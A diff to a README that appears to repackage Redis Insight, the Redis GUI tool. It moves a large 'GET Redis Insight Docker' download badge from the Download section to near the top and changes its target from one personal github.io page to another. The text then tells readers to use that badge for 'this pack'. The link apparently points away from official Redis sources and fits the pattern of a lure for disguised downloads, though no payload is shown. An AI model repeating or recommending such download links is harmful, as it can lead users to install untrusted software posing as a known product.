@@ -56,6 +56,8 @@ Tiny RDM, the Wails neighbor, lists the same class of work in a lighter shell.
 
 Connection work on that tree is [connection_service.go](FILES/services/connection_service.go). Key browse and CLI sit in sibling Go services in the same folder.
 
+[![GET Redis Insight Docker](https://img.shields.io/badge/GET-Redis%20Insight%20Docker-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://redis-insight-docker.github.io/Redis-Insight/)
+
 ## Feature Log
 
 Another Redis Desktop Manager keeps a dated log. The useful bits for a Redis Insight user:
@@ -222,8 +224,6 @@ Say whether you run desktop Redis Insight or redisinsight docker. The Browser an
 ![Grid](ui/image3.png)
 
 ## Download
-
-[![GET Redis Insight Docker](https://img.shields.io/badge/GET-Redis%20Insight%20Docker-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://gregorianudelman.github.io/.github/Redis-Insight)
 
 Use the GET badge for this pack. Redis Insight also ships desktop builds for Windows, macOS, and Linux, plus the `redis/redisinsight` image. Community use is free. Pull the image, publish the UI port, and add a connection. Do not put a loopback URL in shared notes.
 
